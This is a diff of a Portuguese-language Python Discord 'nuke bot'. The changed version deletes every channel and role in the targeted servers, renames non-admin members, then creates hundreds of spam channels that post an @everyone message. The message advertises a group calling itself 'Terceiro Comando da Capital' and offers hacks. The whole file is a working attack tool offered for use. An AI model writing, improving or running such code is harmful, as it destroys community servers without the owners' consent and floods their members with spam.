@@ -3,19 +3,22 @@ from discord.ext import commands
 from colorama import init, Fore as cc
 from os import name as os_name, system
 from sys import exit
-import asyncio
-import threading
+import time
 
 init()
-
-# Definição das cores
-r = cc.LIGHTRED_EX
-g = cc.LIGHTGREEN_EX
-w = cc.RESET
-y = cc.LIGHTYELLOW_EX
+dr = DR = r = R = cc.LIGHTRED_EX
+g = G = cc.LIGHTGREEN_EX
+b = B = cc.LIGHTBLUE_EX
+m = M = cc.LIGHTMAGENTA_EX
+c = C = cc.LIGHTCYAN_EX
+y = Y = cc.LIGHTYELLOW_EX
+w = W = cc.RESET
 
 clear = lambda: system('cls') if os_name == 'nt' else system('clear')
-def _input(text): print(text, end=''); return input()
+
+def _input(text):
+    print(text, end='')
+    return input()
 
 baner = f'''
 {r}██████╗     ██╗  ██╗
@@ -24,102 +27,144 @@ baner = f'''
 {r}██║  ██║    ██╔═██╗ 
 {r}██████╔╝    ██║  ██╗
 {r}╚═════╝     ╚═╝  ╚═╝
-{y}Feito por: {g}Menor dk'''
+{y}Feito por: {g}Menor dk
+'''
 
-async def create_text_channels_and_send_message(guild, name, message, stop_event):
-    created = 0
-    
-    while created < 1000 and not stop_event.is_set():
-        tasks = []
-        for _ in range(10):  # Cria 10 canais de texto por vez
+async def delete_all_channel(guild):
+    deleted = 0
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+            deleted += 1
+        except:
+            continue
+    return deleted
+
+async def delete_all_roles(guild):
+    deleted = 0
+    for role in guild.roles:
+        try:
+            await role.delete()
+            deleted += 1
+        except:
+            continue
+    return deleted
+
+async def rename_all_members(guild, name):
+    renamed = 0
+    for member in guild.members:
+        if not member.guild_permissions.administrator:
             try:
-                channel = await guild.create_text_channel(name=name)
-                tasks.append(asyncio.create_task(channel.send(message)))
-                created += 1
+                await member.edit(nick=f'{name} ({member.name})')
+                renamed += 1
             except:
                 continue
-        
-        await asyncio.gather(*tasks)
-        await asyncio.sleep(1)  # Intervalo entre a criação dos canais
-    
+    return renamed
+
+async def create_text_channels(guild, name, message):
+    created = 0
+    for _ in range(10):  # Cria 10 canais por vez
+        try:
+            channel = await guild.create_text_channel(name=name)
+            await channel.send(message)  # Envia mensagem no canal criado
+            created += 1
+        except:
+            continue
     return created
 
-async def nuke_guild(guild, name, message, stop_event):
-    print(f'{r}Iniciando Nuke no servidor: {y}{guild.name}')
+async def nuke_guild(guild, name, message):
+    print(f'{r}Nuke: {m}{guild.name}')
     
-    # Renomeia o servidor
-    await guild.edit(name="T . C . C TERCEIRO COMANDO DA CAPITAL 🇮🇶")
+    # Renomeia membros
+    renamed = await rename_all_members(guild, name)
+    print(f'{m}Renomeados: {b}{renamed}')
     
-    # Cria canais de texto e envia mensagens
-    created_text_channels = await create_text_channels_and_send_message(guild, name, message, stop_event)
+    # Deleta canais
+    deleted_channels = await delete_all_channel(guild)
+    print(f'{m}Canais deletados: {b}{deleted_channels}')
     
-    print(f'{g}Servidor {w}{guild.name}{g} atualizado com sucesso!')
-    print(f'{y}Canais de texto criados: {g}{created_text_channels}')
+    # Deleta roles
+    deleted_roles = await delete_all_roles(guild)
+    print(f'{m}Roles deletados: {b}{deleted_roles}')
+    
+    # Cria canais de texto
+    created_channels = 0
+    while created_channels < 500:
+        created = await create_text_channels(guild, name, message)
+        created_channels += created
+        print(f'{m}Canais criados: {b}{created_channels}')
+        time.sleep(1)  # Atraso para evitar problemas
+    
     print(f'{r}--------------------------------------------\n\n')
 
-def stop_bot(stop_event):
-    while True:
-        choice = _input(f'''
+def main():
+    clear()
+    choice = _input(f'''   
 {baner}                
-{w}--------------------------------------------
-{w}[Menu]
-    {y}└─[1] {g}Executar Setup Nuke Bot
-    {y}└─[2] {g}Sair
-    {y}└─[3] {g}Parar
+{c}--------------------------------------------
+{b}[Menu]
+    {y}└─[1] {m}- {g}Executar Setup Nuke Bot
+    {y}└─[2] {m}- {g}Sair
+    {y}└─[3] {m}- {g}Parar
 {y}====>{g}''')
-        if choice == '1':
-            return
-        elif choice == '2':
-            print(f'{r}Saindo...')
-            exit()
-        elif choice == '3':
-            stop_event.set()
-            print(f'{r}Parando...')
-            return
-
-async def main(token, name, message, stop_event):
-    client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
     
-    @client.event
-    async def on_ready():
-        print(f'''
-[+] Logado como {client.user.name}
-[+] Bot em {len(client.guilds)} servidores!''')
-        if stop_event.is_set():
-            await client.close()
-            return
-        
-        for guild in client.guilds:
-            await nuke_guild(guild, name, message, stop_event)
-            if stop_event.is_set():
-                break
-        
-        await client.close()
-
-    try:
-        await client.start(token)
-    except Exception as error:
-        if str(error) == "Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.":
-            input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para retornar...')
-        else:
-            input(f'{r}{error}\n{b}Pressione Enter para retornar...')
-
-if __name__ == '__main__':
-    stop_event = threading.Event()
-    
-    stop_thread = threading.Thread(target=stop_bot, args=(stop_event,))
-    stop_thread.start()
-    
-    token = _input(f'{y}Insira o token do bot:{g}')
-    name = _input(f'{y}Insira o nome para os canais criados:{g}')
-    message = '''# DKZIN 🔥🥋🇾🇪
-> - TERCEIRO COMANDO DA CAPITAL NA ATIVA, ENTREM PRA TROPA E SEJAM FELIZES 👑
+    if choice == '1':
+        token = _input(f'{y}Insira o token do bot:{g}')
+        name = _input(f'{y}Insira o nome para os canais criados:{g}')
+        message = '''# DKZIN 🔥🥋🇾🇪
+> - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
 - https://discord.com/invite/gZSx3n8Csa
 
 > TEMOS OTIMOS HACKS E METHODOS 
 > BOTS DE KEY E MUITO MAIS
 
 @here @everyone'''
-    
-    asyncio.run(main(token, name, message, stop_event))
-    stop_thread.join()
+        
+        clear()
+        choice_type = _input(f'''
+{baner}                
+{c}--------------------------------------------
+{b}[Selecione]
+    {y}└─[1] {m}- {g}Nuke de todos os servidores.
+    {y}└─[2] {m}- {g}Nuke apenas um servidor.
+    {y}└─[3] {m}- {g}Sair
+{y}====>{g}''')
+        
+        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
+        
+        if choice_type == '1':
+            @client.event
+            async def on_ready():
+                print(f'[+] Logado como {client.user.name}')
+                print(f'[+] Bot em {len(client.guilds)} servidores!')
+                for guild in client.guilds:
+                    await nuke_guild(guild, name, message)
+                await client.close()
+        
+        elif choice_type == '2':
+            guild_id = _input(f'{y}Insira o id do servidor:{g}')
+            @client.event
+            async def on_ready():
+                for guild in client.guilds:
+                    if str(guild.id) == guild_id:
+                        await nuke_guild(guild, name, message)
+                await client.close()
+        
+        elif choice_type == '3':
+            print(f'{dr}Saindo...')
+            exit()
+        
+        try:
+            client.run(token)
+            _input('Nuke concluído, pressione Enter para voltar ao menu...')
+        except Exception as error:
+            if 'Privileged Intents' in str(error):
+                _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
+            else:
+                _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
+    elif choice == '2':
+        print(f'{dr}Saindo...')
+        exit()
+
+if __name__ == "__main__":
+    main()
